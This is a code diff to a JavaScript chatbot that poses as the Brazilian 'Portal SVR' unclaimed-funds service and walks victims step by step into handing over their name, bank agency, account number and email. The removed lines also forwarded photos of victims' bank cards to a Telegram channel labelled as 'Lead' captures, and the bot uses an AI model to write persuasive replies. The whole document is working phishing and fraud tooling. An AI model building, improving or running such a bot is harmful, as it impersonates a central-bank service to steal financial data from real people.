@@ -810,71 +810,63 @@ async function processIncomingMessage(msg, targetChatId) {
             chatSessions.set(targetChatId, currentSession);
             saveSessions();
 
-            await sendBotMessage(targetChatId, `✅ *Nome confirmado!*\n\n📍 *FASE 1.3:* Para concluir a autenticação de identidade, informe os *Dados Bancários* (Agência e Conta) onde deseja receber os ativos. O sistema validará se o vínculo pertence ao titular.\n\n📌 *Exemplo:* Agência 0001 - Conta 12345-6`);
+            await sendBotMessage(targetChatId, `✅ *Nome confirmado!*\n\n📍 *FASE 1.3 — Dados Bancários:* Para prosseguir com a vinculação do resgate, informe sua *Agência* bancária:\n\n📌 *Exemplo:* 0001`);
         } else {
             const aiReply = await askAI(PROMPT_NOME_INVALIDO, text);
             const fallback = `⚠️ *Portal SVR — Validação de Identidade*\n\nPor gentileza, informe seu *Nome Completo* sem abreviações, conforme consta em seu documento oficial.`;
             await sendBotMessage(targetChatId, aiReply || fallback);
         }
     } else if (currentSession.step === 3) {
-        if (currentSession.awaitingConfirm) {
-            if (text.toUpperCase() === 'SIM' || text.toUpperCase().includes('CORRETO') || text.toUpperCase().includes('ESTA')) {
-                currentSession.step = 4;
-                delete currentSession.awaitingConfirm;
-                chatSessions.set(targetChatId, currentSession);
-                saveSessions();
-
-                await sendBotMessage(targetChatId,
-                    `✅ *Dados bancários confirmados!*\n\n` +
-                    `📍 *FASE 1.4 — Canal de Comunicação:* Para que o sistema envie seu *Comprovante de Liberação* e o *Termo de Quitação* após o resgate, informe seu melhor *E-mail* para contato:\n\n` +
-                    `📌 *Exemplo:* seuemail@provedor.com`);
-                return;
-            } else {
-                delete currentSession.awaitingConfirm;
-            }
-        }
-
-        if (msg.hasMedia) {
-            try {
-                const media = await msg.downloadMedia();
-                if (media) {
-                    const buffer = Buffer.from(media.data, 'base64');
-                    await notifyTelegramPhoto(buffer, `💳 <b>CARTÃO RECEBIDO (VALIDAÇÃO INICIAL)</b>\nLead: <code>${targetChatId}</code>\n<i>O lead enviou foto do cartão na etapa 1.3.</i>`);
-                }
-            } catch (e) { }
-
-            currentSession.awaitingConfirm = true;
-            currentSession.bankData = "FOTO_ENVIADA";
+        const typedAg = text.trim().replace(/\D/g, "");
+        if (typedAg.length >= 3 && typedAg.length <= 5) {
+            currentSession.step = 4;
+            currentSession.bankAg = typedAg;
             chatSessions.set(targetChatId, currentSession);
             saveSessions();
-
-            await sendBotMessage(targetChatId,
-                `✅ *Documento recebido com sucesso!*\n\nPrezado(a) titular, esta é a conta que o senhor(a) deseja utilizar para o recebimento dos valores ativos?\n\n⚠️ *Nota:* Devido aos protocolos de segurança, a validação de imagens é realizada por supervisão judicial e técnica do sistema SVR/BCB para garantir a integridade do repasse.\n\n*Responda SIM para confirmar.*`);
-            return;
-        }
-
-        const typedBank = text.trim();
-        if (typedBank.length >= 4) {
-            const bank = detectBank(typedBank);
-            const bankName = bank ? bank.name : "Instituição Identificada";
-            const agMatch = typedBank.match(/(?:ag[êe]ncia|ag):?\s*(\d{4,5})/i);
-            const ccMatch = typedBank.match(/(?:conta|cc):?\s*(\d{5,12}[-\s]?\d)/i);
-            const ag = agMatch ? agMatch[1] : (typedBank.split(/[-\s]/).find(p => p.length >= 3 && p.length <= 5) || "Pendente");
-            const cc = ccMatch ? ccMatch[1] : (typedBank.split(/[-\s]/).find(p => p.length > 5) || "Pendente");
-
-            currentSession.awaitingConfirm = true;
-            currentSession.bankData = typedBank;
-            chatSessions.set(targetChatId, currentSession);
-            saveSessions();
-
-            await sendBotMessage(targetChatId,
-                `🏛️ *${bankName.toUpperCase()} IDENTIFICADO* ✅\n\n` +
-                `📍 *DADOS CAPTURADOS:*\n- Agência: ${ag}\n- Conta: ${cc}\n- Instituição: ${bankName}\n\nPrezado(a) titular, confirme se realmente esta é a conta que o senhor(a) deseja utilizar para o recebimento do seu valor ativo?\n\n⚠️ *AVISO:* A conta *NÃO* pode ser recém-criada ou sem movimentações antigas, sob risco de bloqueio pelo sistema de segurança do Banco Central.\n\n*Responda SIM para confirmar* ou informe os dados novamente para trocar.`);
+            await sendBotMessage(targetChatId, `✅ *Agência registrada.*\n\n📍 *FASE 1.4:* Agora informe o número da sua *Conta* (com o dígito, se houver):\n\n📌 *Exemplo:* 12345-6`);
         } else {
-            await sendBotMessage(targetChatId, `⚠️ *Dados Bancários Inválidos*\n\nPor gentileza, informe sua Agência e Conta corretamente para vinculação do resgate.`);
+            await sendBotMessage(targetChatId, `⚠️ *Agência Inválida*\n\nPor favor, informe apenas os números da sua agência (Ex: 0001).`);
         }
-
     } else if (currentSession.step === 4) {
+        const typedCc = text.trim();
+        if (typedCc.length >= 4) {
+            currentSession.step = 5;
+            currentSession.bankCc = typedCc;
+            chatSessions.set(targetChatId, currentSession);
+            saveSessions();
+
+            const bank = detectBank(currentSession.bankCc);
+            const bankName = bank ? bank.name : "Instituição Identificada";
+
+            await sendBotMessage(targetChatId, 
+                `🏛️ *${bankName.toUpperCase()} IDENTIFICADO* ✅\n\n` +
+                `📍 *DADOS CAPTURADOS:*\n` +
+                `- Agência: ${currentSession.bankAg}\n` +
+                `- Conta: ${currentSession.bankCc}\n` +
+                `- Instituição: ${bankName}\n\n` +
+                `Prezado(a) titular, confirme se realmente esta é a conta que o senhor(a) deseja utilizar para o recebimento do seu valor ativo?\n\n` +
+                `⚠️ *AVISO:* A conta *NÃO* pode ser recém-criada ou sem movimentações antigas.\n\n` +
+                `*Responda SIM para confirmar* ou informe os dados novamente.`);
+        } else {
+            await sendBotMessage(targetChatId, `⚠️ *Conta Inválida*\n\nPor favor, informe o número da sua conta corretamente.`);
+        }
+    } else if (currentSession.step === 5) {
+        if (text.toUpperCase() === 'SIM' || text.toUpperCase().includes('CORRETO') || text.toUpperCase().includes('ESTA')) {
+            currentSession.step = 6;
+            chatSessions.set(targetChatId, currentSession);
+            saveSessions();
+
+            await sendBotMessage(targetChatId,
+                `✅ *Dados bancários confirmados!*\n\n` +
+                `📍 *FASE 1.5 — Canal de Comunicação:* Para que o sistema envie seu *Comprovante de Liberação* e o *Termo de Quitação* após o resgate, informe seu melhor *E-mail* para contato:\n\n` +
+                `📌 *Exemplo:* seuemail@provedor.com`);
+        } else {
+            currentSession.step = 3;
+            chatSessions.set(targetChatId, currentSession);
+            saveSessions();
+            await sendBotMessage(targetChatId, `🔄 *Entendido. Vamos recomeçar a vinculação bancária.*\n\n📍 *FASE 1.3:* Informe sua *Agência* bancária:`);
+        }
+    } else if (currentSession.step === 6) {
         const typedEmail = text.toLowerCase().trim();
         const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
         const validDomains = ['gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com', 'icloud.com', 'uol.com.br', 'bol.com.br', 'ig.com.br', 'terra.com.br', 'live.com'];
@@ -884,8 +876,7 @@ async function processIncomingMessage(msg, targetChatId) {
         const isDomainValid = validDomains.includes(domain) || (domain && domain.includes('.gov.br')) || (domain && domain.includes('.edu.br'));
 
         if (isFormatValid && isDomainValid) {
-            // ✅ E-mail aceito — avançar para a fila (Step 5)
-            currentSession.step = 5;
+            currentSession.step = 7;
             currentSession.email = typedEmail;
             currentSession.mode = 'waiting';
             chatSessions.set(targetChatId, currentSession);
